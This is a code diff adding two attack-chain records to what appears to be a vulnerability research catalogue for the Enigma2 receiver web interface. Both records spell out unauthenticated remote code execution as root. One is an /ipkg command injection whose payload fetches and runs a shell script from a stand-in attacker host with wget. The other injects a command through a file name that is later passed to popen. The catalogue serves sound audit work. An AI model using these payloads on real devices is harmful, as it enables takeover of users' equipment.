@@ -607,6 +607,35 @@ E2_ATTACK_CHAIN_SHORT = {
     "prerequisites": "LAN access to port 80",
 }
 
+E2_ATTACK_CHAIN_IPKG = {
+    "chain_id": "E2-CHAIN-3",
+    "title": "1-step unauthenticated RCE via /ipkg command injection",
+    "steps": [
+        "1. E2-F04 (auth=False default) — no credentials needed",
+        "2. E2-F07: GET /ipkg?command=install&package=;wget+-O-+http://attacker/shell.sh|sh",
+        "   → cmd = '/usr/bin/opkg install ;wget -O- http://attacker/shell.sh|sh'",
+        "   → execvp('/bin/sh', ['/bin/sh', '-c', cmd]) → root shell",
+    ],
+    "prerequisites": "LAN access to port 80. Auth=False (default) or auth bypass.",
+    "steps_count": 1,
+    "notes": "Simplest RCE chain. No FTP, no creds, no chaining of multiple vulns needed.",
+}
+
+E2_ATTACK_CHAIN_BOUQUETEDIT = {
+    "chain_id": "E2-CHAIN-4",
+    "title": "2-step unauthenticated RCE via E2-F08 file write + E2-F09 popen injection",
+    "steps": [
+        "1. E2-F04 (auth=False) or E2-F01 bypass",
+        "2. E2-F08: POST /fs/tmp?filename=evil.tar;id → creates /tmp/evil.tar;id",
+        "3. E2-F09: GET /bouqueteditor/web/restore?Filename=/tmp/evil.tar;id",
+        "   → path.exists('/tmp/evil.tar;id') = True",
+        "   → popen('tar -tf /tmp/evil.tar;id') → shell: tar fails, id executes as root",
+    ],
+    "prerequisites": "LAN access to port 80. Auth=False or bypass.",
+    "steps_count": 2,
+    "notes": "Alternative to E2-CHAIN-3 when /ipkg endpoint is blocked. Uses commented-out path confinement bug.",
+}
+
 # ──────────────────────────────────────────────────────────────────────────────
 # BINARY RE: PLT DANGEROUS IMPORT MAP (enigma2 ARM32)
 # Confirmed PLT addresses: verified via ELF LOAD segment (VA=0x10000, file_off=0x0)
